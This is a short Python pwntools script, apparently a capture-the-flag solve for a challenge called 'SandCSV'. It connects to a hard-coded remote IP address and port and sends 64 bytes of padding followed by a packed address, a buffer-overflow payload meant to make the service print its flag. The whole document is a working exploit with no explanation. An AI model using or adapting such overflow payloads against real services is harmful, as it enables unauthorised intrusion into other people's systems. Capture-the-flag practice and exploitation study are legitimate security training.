#!/usr/bin/env python3
"""03 SandCSV: remote blind solve (pwntools + network only)."""
from pwn import *

HOST = '167.86.100.57'
PORT = 9003
FLAG_STR = 0x40201e

context.arch = 'amd64'
context.log_level = 'error'
io = remote(HOST, PORT)
io.recvuntil(b'row')

payload = b'A' * 64 + p64(FLAG_STR)
io.sendline(payload)
print(io.recvall(timeout=2).decode(errors='ignore'), end='')
